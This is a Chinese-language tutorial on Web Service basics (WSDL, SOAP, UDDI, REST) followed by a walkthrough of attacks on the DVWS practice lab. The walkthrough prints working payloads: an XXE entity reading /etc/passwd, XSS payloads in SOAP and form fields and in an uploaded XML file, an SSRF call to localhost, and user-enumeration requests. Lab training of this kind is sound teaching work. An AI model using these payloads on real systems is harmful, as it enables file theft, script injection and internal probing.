<div class="detail_content markdown-body editormd-preview-container" id="markdown-body">
<div id="app">
<h2 data-content="1" id="5e469980fb674a5f9b5fe66526232677">基本介绍</h2>
<p>Web Service也被称之为"XML Web Service"，它是一种跨语言和跨平台的远程调用(RPC)技术，主要通过使用标准的Internet协议来提供和接收数据的方式，允许不同的应用程序在不同的平台和编程语言之间进行通信，Web Service通常使用基于标准的XML(可扩展标记语言)格式来编写和传输数据，它们使用HTTP(超文本传输协议)作为通信协议并支持使用SOAP、REST等协议进行通信</p>
<h2 data-content="1" id="df99f6e25815f7210b029b720d2b9947">工作原理</h2>
<p>Web Service的工作原理可以总结为以下几个步骤：</p>
<ul>
<li>描述服务：Web服务通常使用WSDL(Web服务描述语言)来描述服务的功能、接口和数据格式，WSDL是一种基于XML的标准，它提供了一种统一的方式来描述Web服务的特性，使服务提供者和消费者能够理解和交互</li>
<li>公开服务：Web Service可以通过以下多种方式来公开服务，下面是几种常见的方法<ul>
<li>Web服务注册表：Web服务注册表是一种集中管理和发布Web服务的机制，服务提供者将其服务描述(例如：WSDL文件)注册到注册表中并提供有关服务的信息和访问地址，服务消费者可以通过查询注册表来找到所需的服务并获取相应的服务描述和访问信息</li>
<li>UDDI(Universal Description, Discovery, and Integration)：UDDI是一种标准的服务注册和发现协议，用于构建和管理Web服务注册表，它提供了一种统一的方式来描述和访问Web服务并支持服务的分类、搜索和查询</li>
<li>直接公开URL：服务提供者可以将其服务部署到Web服务器上并通过URL(统一资源定位符)来公开服务，服务消费者可以直接使用服务的URL来访问服务并根据服务的描述和接口进行交互</li>
<li>发布到服务目录：服务提供者可以将其服务描述(例如:WSDL文件)发布到服务目录或文档中，例如：企业内部的服务目录或在线文档库，服务消费者可以浏览目录或搜索文档以找到所需的服务并获取相关的服务描述和访问信息</li>
<li>使用API管理平台：API管理平台是一种用于管理和公开Web服务的集成平台，它提供了一套工具和功能，帮助服务提供者将其服务注册、文档化、安全保护并向服务消费者提供访问权限和控制</li>
</ul>
</li>
<li>访问服务：服务消费者通过使用服务的URL或其他服务发现机制来找到所需的服务，消费者一旦找到服务就可以根据WSDL文件了解服务的功能和调用方式</li>
<li>构建请求：服务消费者根据服务的WSDL文件构建请求并将其封装为适当的格式，例如：SOAP消息或RESTFUL请求，请求可能包含输入参数、身份验证信息等</li>
<li>发送请求：服务消费者通过HTTP协议将请求发送给Web服务的URL，请求通过网络传输到服务提供者的服务器</li>
<li>处理请求：服务提供者的服务器接收到请求后根据请求中的信息找到相应的服务并调用相应的功能，随后根据请求中的参数执行所需的操作并生成相应的结果</li>
<li>构建响应：服务提供者将执行结果封装为适当的格式，例如:SOAP响应或RESTFUL响应，响应可能包含输出参数、错误信息等</li>
<li>返回响应：服务提供者的服务器将响应发送回服务消费者，响应通过HTTP协议传输到消费者的应用程序</li>
<li>解析响应：消费者的应用程序接收到响应后解析响应并提取所需的数据或结果，应用程序可以根据响应进行后续的处理和逻辑操作</li>
</ul>
<h2 data-content="1" id="8f87bcd273c05977360f41fe36defeba">简易分类</h2>
<p>Web服务可以分为以下几个主要类别：</p>
<ul>
<li>SOAP Web服务：SOAP(Simple Object Access Protocol)是一种基于XML的协议，用于在网络上进行应用程序之间的通信，SOAP Web服务使用SOAP消息格式作为数据交换的基础，通常通过HTTP协议进行传输，SOAP Web服务提供了基于操作的接口定义并使用WSDL来描述服务的功能和接口</li>
<li>RESTful Web服务：REST(Representational State Transfer)是一种基于Web的架构风格，用于构建分布式系统，RESTful Web服务使用HTTP协议的各种方法(例如：GET、POST、PUT、DELETE)来进行资源的增删改查操作，RESTful Web服务通常使用JSON或XML作为数据格式并使用URL来标识和访问资源</li>
<li>XML-RPC：XML-RPC是一种远程过程调用(RPC)协议，用于在不同的计算机之间进行通信，XML-RPC使用XML格式进行数据交换并通过HTTP协议进行传输，它提供了一种简单的方式来调用远程方法并将参数和结果封装在XML消息中</li>
<li>JSON-RPC：JSON-RPC是一种轻量级的远程过程调用协议，用于在网络上进行通信，JSON-RPC使用JSON格式作为数据交换的基础并通过HTTP协议进行传输，它提供了一种简单的方式来调用远程方法并将参数和结果封装在JSON消息中</li>
<li>Web Socket：Web Socket是一种在Web浏览器和服务器之间进行全双工通信的协议，它允许在单个持久连接上进行双向通信，而无需为每个请求创建新的连接，Web Socket使用标准HTTP协议进行握手并在建立连接后使用自定义的协议进行数据交换</li>
</ul>
<h2 data-content="1" id="5027667f1e33dfd6dedf0a23de61b5a9">关键要素</h2>
<p>Web Service三要素包括WSDL(WebServicesDescriptionLanguage)、SOAP(Simple Object Access Protocol)、UDDI(UniversalDescriptionDiscovery andIntegration)，其中WSDL用来描述如何访问具体的接口、SOAP用来描述传递信息的格式、UDDI用来管理分发查询Web Service</p>
<h3 data-content="1" id="3a1d65de9681165a1f9f4b193d3d461c">WSDL技术</h3>
<h4 data-content="1" id="3164504f14fed2e3eaa5ac1c9c5cf23d">基本介绍</h4>
<p>WSDL(Web Services Description Language，Web服务描述语言)是一种用于描述Web服务的XML格式语言，它提供了一种标准的方式来描述Web服务的接口、消息格式和协议细节，WSDL定义了服务的结构和功能，使得服务提供者和消费者可以相互理解和交互</p>
<h4 data-content="1" id="5bc0bc38c468789524f49a2a1ba57993">简易示例</h4>
<p>下面是一个简单的WSDL示例代码：</p>
<div class="highlight"><pre><span></span><span class="nt">&lt;definitions</span> <span class="na">xmlns=</span><span class="s">"http://schemas.xmlsoap.org/wsdl/"</span>
             <span class="na">xmlns:soap=</span><span class="s">"http://schemas.xmlsoap.org/wsdl/soap/"</span>
             <span class="na">targetNamespace=</span><span class="s">"http://example.com/stockquote.wsdl"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;types&gt;</span>
        <span class="nt">&lt;schema</span> <span class="na">targetNamespace=</span><span class="s">"http://example.com/stockquote.xsd"</span>
                <span class="na">xmlns=</span><span class="s">"http://www.w3.org/2001/XMLSchema"</span><span class="nt">&gt;</span>
            <span class="nt">&lt;element</span> <span class="na">name=</span><span class="s">"GetStockPriceRequest"</span><span class="nt">&gt;</span>
                <span class="nt">&lt;complexType&gt;</span>
                    <span class="nt">&lt;sequence&gt;</span>
                        <span class="nt">&lt;element</span> <span class="na">name=</span><span class="s">"symbol"</span> <span class="na">type=</span><span class="s">"string"</span><span class="nt">/&gt;</span>
                    <span class="nt">&lt;/sequence&gt;</span>
                <span class="nt">&lt;/complexType&gt;</span>
            <span class="nt">&lt;/element&gt;</span>
            <span class="nt">&lt;element</span> <span class="na">name=</span><span class="s">"GetStockPriceResponse"</span><span class="nt">&gt;</span>
                <span class="nt">&lt;complexType&gt;</span>
                    <span class="nt">&lt;sequence&gt;</span>
                        <span class="nt">&lt;element</span> <span class="na">name=</span><span class="s">"price"</span> <span class="na">type=</span><span class="s">"decimal"</span><span class="nt">/&gt;</span>
                    <span class="nt">&lt;/sequence&gt;</span>
                <span class="nt">&lt;/complexType&gt;</span>
            <span class="nt">&lt;/element&gt;</span>
        <span class="nt">&lt;/schema&gt;</span>
    <span class="nt">&lt;/types&gt;</span>
    <span class="nt">&lt;message</span> <span class="na">name=</span><span class="s">"GetStockPriceInput"</span><span class="nt">&gt;</span>
        <span class="nt">&lt;part</span> <span class="na">name=</span><span class="s">"parameters"</span> <span class="na">element=</span><span class="s">"tns:GetStockPriceRequest"</span><span class="nt">/&gt;</span>
    <span class="nt">&lt;/message&gt;</span>
    <span class="nt">&lt;message</span> <span class="na">name=</span><span class="s">"GetStockPriceOutput"</span><span class="nt">&gt;</span>
        <span class="nt">&lt;part</span> <span class="na">name=</span><span class="s">"parameters"</span> <span class="na">element=</span><span class="s">"tns:GetStockPriceResponse"</span><span class="nt">/&gt;</span>
    <span class="nt">&lt;/message&gt;</span>
    <span class="nt">&lt;portType</span> <span class="na">name=</span><span class="s">"StockQuotePortType"</span><span class="nt">&gt;</span>
        <span class="nt">&lt;operation</span> <span class="na">name=</span><span class="s">"GetStockPrice"</span><span class="nt">&gt;</span>
            <span class="nt">&lt;input</span> <span class="na">message=</span><span class="s">"tns:GetStockPriceInput"</span><span class="nt">/&gt;</span>
            <span class="nt">&lt;output</span> <span class="na">message=</span><span class="s">"tns:GetStockPriceOutput"</span><span class="nt">/&gt;</span>
        <span class="nt">&lt;/operation&gt;</span>
    <span class="nt">&lt;/portType&gt;</span>
    <span class="nt">&lt;binding</span> <span class="na">name=</span><span class="s">"StockQuoteBinding"</span> <span class="na">type=</span><span class="s">"tns:StockQuotePortType"</span><span class="nt">&gt;</span>
        <span class="nt">&lt;soap:binding</span> <span class="na">style=</span><span class="s">"document"</span> <span class="na">transport=</span><span class="s">"http://schemas.xmlsoap.org/soap/http"</span><span class="nt">/&gt;</span>
        <span class="nt">&lt;operation</span> <span class="na">name=</span><span class="s">"GetStockPrice"</span><span class="nt">&gt;</span>
            <span class="nt">&lt;soap:operation</span> <span class="na">soapAction=</span><span class="s">"http://example.com/stockquote/GetStockPrice"</span><span class="nt">/&gt;</span>
            <span class="nt">&lt;input&gt;</span>
                <span class="nt">&lt;soap:body</span> <span class="na">use=</span><span class="s">"literal"</span><span class="nt">/&gt;</span>
            <span class="nt">&lt;/input&gt;</span>
            <span class="nt">&lt;output&gt;</span>
                <span class="nt">&lt;soap:body</span> <span class="na">use=</span><span class="s">"literal"</span><span class="nt">/&gt;</span>
            <span class="nt">&lt;/output&gt;</span>
        <span class="nt">&lt;/operation&gt;</span>
    <span class="nt">&lt;/binding&gt;</span>
    <span class="nt">&lt;service</span> <span class="na">name=</span><span class="s">"StockQuoteService"</span><span class="nt">&gt;</span>
        <span class="nt">&lt;port</span> <span class="na">name=</span><span class="s">"StockQuotePort"</span> <span class="na">binding=</span><span class="s">"tns:StockQuoteBinding"</span><span class="nt">&gt;</span>
            <span class="nt">&lt;soap:address</span> <span class="na">location=</span><span class="s">"http://example.com/stockquote"</span><span class="nt">/&gt;</span>
        <span class="nt">&lt;/port&gt;</span>
    <span class="nt">&lt;/service&gt;</span>
<span class="nt">&lt;/definitions&gt;</span>
</pre></div>
<p>上面的这段示例代码描述了一个名为"StockQuoteService"的股票报价Web服务，下面是代码结构的详细解释：</p>
<ul>
<li>definitions元素：定义了WSDL文档的命名空间和目标命名空间</li>
<li>types元素：定义了WSDL中使用的数据类型，在示例中通过schema元素定义了两个数据类型：GetStockPriceRequest和GetStockPriceResponse</li>
<li>message元素：定义了WSDL中使用的消息，在示例中定义了两个消息：GetStockPriceInput和GetStockPriceOutput，它们分别使用了前面定义的数据类型</li>
<li>portType元素：定义了服务接口，即提供的操作和消息交换模式，在示例中定义了一个名为StockQuotePortType的接口，其中包含一个名为GetStockPrice的操作</li>
<li>binding元素：绑定了服务接口和具体的传输协议，在示例中使用SOAP协议进行绑定并指定了HTTP作为传输协议</li>
<li>service元素：定义了服务的名称和端口信息，在示例中定义了名为StockQuoteService的服务并包含一个名为StockQuotePort的端口</li>
<li>soap:address元素：定义了服务的访问地址，在示例中指定了服务的地址为<a href="http://example.com/stockquote" target="_blank">http://example.com/stockquote</a>
</li>
</ul>
<h3 data-content="1" id="2b164ec43e3ae4366bdccbeff8558de0">SOAP技术</h3>
<h4 data-content="1" id="8333b97cdb38430fac51afbaffcfdd9d">基本介绍</h4>
<p>SOAP(Simple Object Access Protocol)是一种基于XML的通信协议，用于在网络上进行应用程序之间的信息交换，它定义了一种标准的消息格式和传输协议，使得不同平台上的应用程序可以相互通信</p>
<h4 data-content="1" id="471681c821272bf5312d7caf0700f899">简易示例</h4>
<p>下面是一个简单的SOAP示例代码及其详细解释：</p>
<div class="highlight"><pre><span></span><span class="nt">&lt;soap:Envelope</span> <span class="na">xmlns:soap=</span><span class="s">"http://schemas.xmlsoap.org/soap/envelope/"</span><span class="nt">&gt;</span>
  <span class="nt">&lt;soap:Header&gt;</span>
    <span class="c">&lt;!-- 可选的SOAP头部信息 --&gt;</span>
  <span class="nt">&lt;/soap:Header&gt;</span>
  <span class="nt">&lt;soap:Body&gt;</span>
    <span class="nt">&lt;GetStockPrice</span> <span class="na">xmlns=</span><span class="s">"http://example.com/stockquote"</span><span class="nt">&gt;</span>
      <span class="nt">&lt;symbol&gt;</span>GOOGL<span class="nt">&lt;/symbol&gt;</span>
    <span class="nt">&lt;/GetStockPrice&gt;</span>
  <span class="nt">&lt;/soap:Body&gt;</span>
<span class="nt">&lt;/soap:Envelope&gt;</span>
</pre></div>
<p>这段示例代码展示了一个基本的SOAP消息，下面是代码结构的详细解释：</p>
<ul>
<li>soap:Envelope元素：根元素，定义了SOAP消息的XML命名空间和SOAP版本</li>
<li>soap:Header元素：可选的SOAP头部信息，在示例中未包含任何头部信息</li>
<li>soap:Body元素：包含了实际的SOAP消息体，在示例中使用了一个名为GetStockPrice的自定义操作</li>
<li>GetStockPrice元素：自定义操作的名称，它位于<a href="http://example.com/stockquote命名空间下" target="_blank">http://example.com/stockquote命名空间下</a>
</li>
<li>&lt;symbol&gt;GOOGL&lt;/symbol&gt;元素：操作的参数，用于指定股票的符号(symbol)，在示例中指定了股票符号为"GOOGL"</li>
</ul>
<p>简易的文档结构示例图如下所示：<br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20240202093419-2f54cea4-c16b-1.png"/></p>
<h3 data-content="1" id="1bc281a7d4af6cd9699f2dba84084414">传输协议</h3>
<p>SOAP消息以XML格式进行编码和传输，可以通过不同的协议(例如:HTTP、SMTP等)进行传输，SOAP允许在消息中定义操作、参数和数据类型等信息以便发送方和接收方之间的交互能够正确解析和处理</p>
<h3 data-content="1" id="858a504049f748491cc44ddaf41bea4f">UDDI技术</h3>
<h4 data-content="1" id="13038383c4a37bf5f36a3be4ee22ae79">基本介绍</h4>
<p>UDDI(Universal Description, Discovery, and Integration)是一种用于描述、发现和集成Web服务的技术标准，它提供了一种机制来注册、发布和查找Web服务的信息，使得服务提供者和消费者能够相互发现和使用Web服务</p>
<h4 data-content="1" id="4cac62bd7fc4f384faf57e8bb6dd6263">简易示例</h4>
<p>下面是一个简单的UDDI示例代码及其详细解释</p>
<div class="highlight"><pre><span></span><span class="nt">&lt;find_business</span> <span class="na">xmlns=</span><span class="s">"urn:uddi-org:api_v3"</span><span class="nt">&gt;</span>
  <span class="nt">&lt;findQualifiers&gt;</span>
    <span class="nt">&lt;findQualifier&gt;</span>exactNameMatch<span class="nt">&lt;/findQualifier&gt;</span>
  <span class="nt">&lt;/findQualifiers&gt;</span>
  <span class="nt">&lt;name&gt;</span>StockQuoteService<span class="nt">&lt;/name&gt;</span>
<span class="nt">&lt;/find_business&gt;</span>
</pre></div>
<p>下面是代码结构的详细解释：</p>
<ul>
<li>find_business元素：定义了UDDI查询消息的XML命名空间和操作类型</li>
<li>findQualifiers元素：定义了查询的限定符(qualifier)，用于指定查询的行为，在示例中使用了exactNameMatch限定符，表示精确名称匹配</li>
<li>name元素：指定了要查询的服务名称，在示例中要查找的服务名称为"StockQuoteService"</li>
</ul>
<h3 data-content="1" id="c684f6833fe421d04632ad6488e2b4b3">REST技术</h3>
<h4 data-content="1" id="c0ad04abd9cc7fd18881af25cfc409e6">基本介绍</h4>
<p>REST(Representational State Transfer)是一种用于设计网络应用程序的架构风格，它基于一组原则和约束，旨在提供简单、可扩展、可靠和可互操作的系统，REST使用标准的HTTP协议和方法来进行通信并以资源为中心进行设计</p>
<h4 data-content="1" id="581940af19d1364636a9ca9aca2eef7e">资源操作</h4>
<p>REST使用HTTP作为通信协议，通过不同的HTTP方法对资源进行操作，以下是常见的HTTP方法和其对应的操作</p>
<ul>
<li>GET：获取资源</li>
<li>POST：创建新资源</li>
<li>PUT：更新现有资源</li>
<li>DELETE：删除资源</li>
</ul>
<p>下面是一个简单的示例代码：</p>
<div class="highlight"><pre><span></span>GET /api/products/1234 HTTP/1.1
Host: example.com
</pre></div>
<h2 data-content="1" id="dfa1c9863755323fb90cd1781baa3b7a">文件解析</h2>
<p>在遇到类似<a href="http://192.168.204.161/Vulnerable.asmx?wsdl" target="_blank">http://192.168.204.161/Vulnerable.asmx?wsdl</a> 的错乱的文件时，我们除了可以直接看提供的SOAP接口信息之外，我们还可以借助Burpsuite的WSDLer插件对此进行解析</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240202093640-832fd1f4-c16b-1.png"/></p>
<p>下面时我们对wsdl请求在burpsuite中的解析操作</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240202093706-93267644-c16b-1.png"/></p>
<p>随后我们即可获取到对应的可调用的接口列表信息并对其进行Fuzzing测试</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240202093731-a1e942ba-c16b-1.png"/></p>
<h2 data-content="1" id="3f970959411d75fe13aedb1ab2c0e3be">安全漏洞</h2>
<p>在设计开发或配置Web服务时可能存在的弱点或缺陷，可能导致未授权访问、信息泄露、拒绝服务、跨站脚本(XSS)、跨站请求伪造(CSRF)等安全问题</p>
<h3 data-content="1" id="6869c0a194f0da5ec98b7880b73b7877">实体注入</h3>
<p>如果包含外部实体引用的XML输入由弱配置的XML解析器处理时会发生XML外部实体(XXE)注入，此类攻击可能导致机密数据泄露、拒绝服务、服务器端请求伪造等，常见的是Web服务或API支持来自用户的XML数据，在DVWS中通过访问显示SOAP服务器支持的操作的<a href="http://192.168.204.160/dvwsuserservice?wsdl" target="_blank">http://192.168.204.160/dvwsuserservice?wsdl</a> 来浏览该服务器<br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20240202093800-b35329da-c16b-1.png"/></p>
<p>WSDL操作表明可以向SOAP服务发送以下请求来查看用户是否存在</p>
<div class="highlight"><pre><span></span>POST /dvwsuserservice/ HTTP/1.1
Host: 192.168.204.160
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4164.0 Safari/537.36 autochrome/red
Connection: close
SOAPAction: Username
Content-Type: text/xml;charset=UTF-8
Content-Length: 469

<span class="nt">&lt;soapenv:Envelope</span> <span class="na">xmlns:xsi=</span><span class="s">"http://www.w3.org/2001/XMLSchema-instance"</span> <span class="na">xmlns:xsd=</span><span class="s">"http://www.w3.org/2001/XMLSchema"</span> <span class="na">xmlns:soapenv=</span><span class="s">"http://schemas.xmlsoap.org/soap/envelope/"</span> <span class="na">xmlns:urn=</span><span class="s">"urn:examples:usernameservice"</span><span class="nt">&gt;</span>
   <span class="nt">&lt;soapenv:Header/&gt;</span>
   <span class="nt">&lt;soapenv:Body&gt;</span>
      <span class="nt">&lt;urn:Username</span> <span class="na">soapenv:encodingStyle=</span><span class="s">"http://schemas.xmlsoap.org/soap/encoding/"</span><span class="nt">&gt;</span>
         <span class="nt">&lt;username</span> <span class="na">xsi:type=</span><span class="s">"xsd:string"</span><span class="nt">&gt;</span>geroet<span class="nt">&lt;/username&gt;</span>
      <span class="nt">&lt;/urn:Username&gt;</span>
   <span class="nt">&lt;/soapenv:Body&gt;</span>
<span class="nt">&lt;/soapenv:Envelope&gt;</span>
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240202093832-c6492bca-c16b-1.png"/><br/>
SOAP服务器用来解析该请求的XML库允许使用外部实体，因此我们可以利用它从SOAP服务中读取任意文件</p>
<div class="highlight"><pre><span></span>POST /dvwsuserservice/ HTTP/1.1
Host: 192.168.204.160
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4164.0 Safari/537.36 autochrome/red
Connection: close
SOAPAction: Username
Content-Type: text/xml;charset=UTF-8
Content-Length: 579

<span class="cp">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span>
<span class="cp">&lt;!DOCTYPE root [ &lt;!ENTITY exploit SYSTEM "file:///etc/passwd"&gt;</span> ]&gt;
<span class="nt">&lt;soapenv:Envelope</span> <span class="na">xmlns:xsi=</span><span class="s">"http://www.w3.org/2001/XMLSchema-instance"</span> <span class="na">xmlns:xsd=</span><span class="s">"http://www.w3.org/2001/XMLSchema"</span> <span class="na">xmlns:soapenv=</span><span class="s">"http://schemas.xmlsoap.org/soap/envelope/"</span> <span class="na">xmlns:urn=</span><span class="s">"urn:examples:usernameservice"</span><span class="nt">&gt;</span>
   <span class="nt">&lt;soapenv:Header/&gt;</span>
   <span class="nt">&lt;soapenv:Body&gt;</span>
      <span class="nt">&lt;urn:Username</span> <span class="na">soapenv:encodingStyle=</span><span class="s">"http://schemas.xmlsoap.org/soap/encoding/"</span><span class="nt">&gt;</span>
         <span class="nt">&lt;username</span> <span class="na">xsi:type=</span><span class="s">"xsd:string"</span><span class="nt">&gt;</span><span class="ni">&amp;exploit;</span><span class="nt">&lt;/username&gt;</span>
      <span class="nt">&lt;/urn:Username&gt;</span>
   <span class="nt">&lt;/soapenv:Body&gt;</span>
<span class="nt">&lt;/soapenv:Envelope&gt;</span>
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240202093903-d859fbc8-c16b-1.png"/></p>
<h3 data-content="1" id="dac502c3c151a7d1b58ab9af580efa28">XSS攻击</h3>
<p>跨站脚本(XSS)攻击发生在可能将恶意脚本注入应用程序并被受害者查看的地方，在SOAP中的XSS其实和传统的Web应用中的XSS也相差不大，只是数据包的构造方式有一些差别，在DVWS管理员用户搜索区域中存在XSS漏洞，我们可以发送HTML编码后的JavaScript到服务器端，例如：&lt;script&gt;alert(1)&lt;/script&gt; ，如下是一个简易的发送示例：</p>
<div class="highlight"><pre><span></span>POST /dvwsuserservice HTTP/1.1
Host: 192.168.204.160
Content-Length: 493
Accept: application/json, text/plain, */*
X-Requested-With: XMLHttpRequest
Authorization: Bearer null
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Content-Type: application/json;charset=UTF-8
Origin: http://192.168.204.160
Referer: http://192.168.204.160/admin.html
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

<span class="nt">&lt;soapenv:Envelope</span> <span class="na">xmlns:xsi=</span><span class="s">"http://www.w3.org/2001/XMLSchema-instance"</span> <span class="na">xmlns:xsd=</span><span class="s">"http://www.w3.org/2001/XMLSchema"</span> <span class="na">xmlns:soapenv=</span><span class="s">"http://schemas.xmlsoap.org/soap/envelope/"</span> <span class="na">xmlns:urn=</span><span class="s">"urn:examples:usernameservice"</span><span class="nt">&gt;</span>
   <span class="nt">&lt;soapenv:Header/&gt;</span>
   <span class="nt">&lt;soapenv:Body&gt;</span>
      <span class="nt">&lt;urn:Username</span> <span class="na">soapenv:encodingStyle=</span><span class="s">"http://schemas.xmlsoap.org/soap/encoding/"</span><span class="nt">&gt;</span>
         <span class="nt">&lt;username</span> <span class="na">xsi:type=</span><span class="s">"xsd:string"</span><span class="nt">&gt;</span><span class="ni">&amp;lt;</span>script<span class="ni">&amp;gt;</span>alert(1)<span class="ni">&amp;lt;</span>/script<span class="ni">&amp;gt;</span><span class="nt">&lt;/username&gt;</span>
      <span class="nt">&lt;/urn:Username&gt;</span>
   <span class="nt">&lt;/soapenv:Body&gt;</span>
<span class="nt">&lt;/soapenv:Envelope&gt;</span>
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240202093948-f36e0e18-c16b-1.png"/></p>
<p>细心的朋友也许可能会发现其实在DVWS的登录区域中也存在一处XSS漏洞，注册用户时我们将一下请求发送到后端API</p>
<div class="highlight"><pre><span></span>POST /api/v2/users HTTP/1.1
Host: 192.168.204.160
Content-Length: 60
Accept: application/json, text/plain, */*
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

username=admin"&gt;<span class="nt">&lt;svg</span><span class="err">/</span><span class="na">onload=</span><span class="s">alert(/a/)</span><span class="nt">&gt;</span><span class="err">&amp;</span>password=12345678
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240202094016-040dd960-c16c-1.png"/></p>
<p>在这里我们还要扩展一个通过上传XML文件导致XSS的示例，构造如下带有XHTML的XML文件：</p>
<div class="highlight"><pre><span></span><span class="cp">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span>
<span class="nt">&lt;xhtml:html</span> <span class="na">xmlns:xhtml=</span><span class="s">"http://www.w3.org/1999/xhtml"</span><span class="nt">&gt;</span>
<span class="nt">&lt;xhtml:script&gt;</span>
    alert(1)
    <span class="nt">&lt;/xhtml:script&gt;</span>
<span class="nt">&lt;/xhtml:html&gt;</span>
</pre></div>
<p>随后进行文件上传操作</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240202094044-1491b66c-c16c-1.png"/></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240202094049-17f98014-c16c-1.png"/></p>
<h3 data-content="1" id="8b082a9862e639af66b0baf937747208">SSRF攻击</h3>
<p>服务器端请求伪造(SSRF)在SOAP中也比较常见，攻击者可以在该漏洞中生成将由应用程序启动的请求，然后可以利用这一点向第三方系统发出请求，例如：进行端口扫描、访问内网应用、进行文件读取等，某些API或RPC服务可能提供从其他API/应用程序以HTTP请求参数的形式获取数据的功能，在这些情况下，我们可以利用API来执行端口扫描等操作，在DVWS应用程序的端口9090中可以使用XML-RPC服务，在DVWS节点应用程序中有关此XML-RPC服务使用的提示显示在的代码注释中<a href="http://192.168.204.160/error.html" target="_blank">http://192.168.204.160/error.html</a> 这些信息也可以通过暴力强制找到<a href="http://192.168.204.160:9090/xmlrpc" target="_blank">http://192.168.204.160:9090/xmlrpc</a> 服务器</p>
<div class="highlight"><pre><span></span>POST /xmlrpc HTTP/1.1
Host: 192.168.204.160:9090
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4164.0 Safari/537.36 autochrome/red
Connection: close
Content-Length: 174
Content-Type: application/x-www-form-urlencoded

<span class="cp">&lt;?xml version="1.0"?&gt;</span><span class="nt">&lt;methodCall&gt;&lt;methodName&gt;</span>dvws.CheckUptime<span class="nt">&lt;/methodName&gt;&lt;params&gt;&lt;param&gt;&lt;value&gt;&lt;string&gt;</span>http://127.0.0.1/uptime<span class="nt">&lt;/string&gt;&lt;/value&gt;&lt;/param&gt;&lt;/params&gt;&lt;/methodCall&gt;</span>
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240202094118-28f84f26-c16c-1.png"/></p>
<h3 data-content="1" id="4804dece3ee56afacbff5109d1993bfd">任意用户枚举</h3>
<p>用户名枚举是一种侦察攻击活动，在这种活动中攻击者试图从可用于实施暴力攻击的API/应用程序中检索有效用户名，应用程序中最容易受到此类攻击的区域是登录页面、注册页面或密码重置页面，在dvws-node中的存在多个点位允许枚举用户名<br/>
1、用户注册接口：</p>
<div class="highlight"><pre><span></span>POST /api/v2/users HTTP/1.1
Host: 192.168.204.160
Content-Length: 30
Accept: application/json, text/plain, */*
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Origin: http://192.168.204.160
Referer: http://192.168.204.160/
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Connection: close

username=admin<span class="err">&amp;</span>password=123456
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240202094148-3aed76fc-c16c-1.png"/></p>
<p>2、XML-RPC Service<br/>
首先访问wsdl文件并使用burpsuite进行解析操作：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240202094203-43b54bca-c16c-1.png"/><br/>
随后得到如下接口信息：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240202094217-4c2d8e3e-c16c-1.png"/><br/>
随后调用接口可以看到回显提示"User Not Found：geroet"，说明 用户不存在，同时也说明我们这里阔以进行枚举操作</p>
<div class="highlight"><pre><span></span>POST /dvwsuserservice/ HTTP/1.1
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Connection: close
SOAPAction: Username
Content-Type: text/xml;charset=UTF-8
Host: dvws.local
Content-Length: 470

<span class="nt">&lt;soapenv:Envelope</span> <span class="na">xmlns:xsi=</span><span class="s">"http://www.w3.org/2001/XMLSchema-instance"</span> <span class="na">xmlns:xsd=</span><span class="s">"http://www.w3.org/2001/XMLSchema"</span> <span class="na">xmlns:soapenv=</span><span class="s">"http://schemas.xmlsoap.org/soap/envelope/"</span> <span class="na">xmlns:urn=</span><span class="s">"urn:examples:usernameservice"</span><span class="nt">&gt;</span>
   <span class="nt">&lt;soapenv:Header/&gt;</span>
   <span class="nt">&lt;soapenv:Body&gt;</span>
      <span class="nt">&lt;urn:Username</span> <span class="na">soapenv:encodingStyle=</span><span class="s">"http://schemas.xmlsoap.org/soap/encoding/"</span><span class="nt">&gt;</span>
         <span class="nt">&lt;username</span> <span class="na">xsi:type=</span><span class="s">"xsd:string"</span><span class="nt">&gt;</span>gero et<span class="nt">&lt;/username&gt;</span>
      <span class="nt">&lt;/urn:Username&gt;</span>
   <span class="nt">&lt;/soapenv:Body&gt;</span>
<span class="nt">&lt;/soapenv:Envelope&gt;</span>
</pre></div>
